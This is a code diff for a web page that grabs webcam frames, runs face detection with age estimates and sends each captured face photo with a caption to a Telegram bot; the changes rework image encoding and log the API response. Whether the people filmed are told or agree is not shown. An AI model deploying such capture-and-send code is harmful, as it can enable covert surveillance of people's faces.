@@ -228,14 +228,23 @@
       }
     }
 
-    function capturePhoto() {
+    function capturePhotoBase64() {
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       const ctx = canvas.getContext('2d');
       ctx.drawImage(video, 0, 0);
-      return new Promise(resolve => {
-        canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
-      });
+      // Получаем base64 без префикса data:image/jpeg;base64,
+      return canvas.toDataURL('image/jpeg', 0.85).split(',')[1];
+    }
+
+    function dataURLtoBlob(dataURL) {
+      const byteString = atob(dataURL);
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
+      for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      return new Blob([ab], { type: 'image/jpeg' });
     }
 
     async function sendToTelegram(detection) {
@@ -244,7 +253,8 @@
       lastSentTime = now;
 
       try {
-        const photoBlob = await capturePhoto();
+        const base64 = capturePhotoBase64();
+        const photoBlob = dataURLtoBlob(base64);
 
         const confidence = (detection.detection.score * 100).toFixed(1);
         const age = Math.round(detection.age);
@@ -269,10 +279,12 @@
         formData.append('photo', photoBlob, 'face_scan.jpg');
         formData.append('caption', caption);
 
-        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
+        const resp = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
           method: 'POST',
           body: formData
         });
+        const data = await resp.json();
+        console.log('TG response:', data);
 
       } catch (e) {
         console.log('TG send error:', e);
